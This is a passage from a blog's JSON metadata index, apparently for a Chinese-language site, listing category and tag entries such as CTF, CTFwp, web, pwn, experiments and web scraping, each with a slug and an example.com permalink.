f&#x27;&lt;&#123;i&#125;&gt;&#x27;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"CTFwp","slug":"CTFwp","permalink":"http://example.com/tags/CTFwp/"},{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"}]}],"categories":[{"name":"实验","slug":"实验","permalink":"http://example.com/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"文章","slug":"实验/文章","permalink":"http://example.com/categories/%E5%AE%9E%E9%AA%8C/%E6%96%87%E7%AB%A0/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"杂项","slug":"杂项","permalink":"http://example.com/tags/%E6%9D%82%E9%A1%B9/"},{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"},{"name":"实验","slug":"实验","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C/"},{"name":"CTFwp","slug":"CTFwp","permalink":"http://example.com/tags/CTFwp/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"},{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"}]}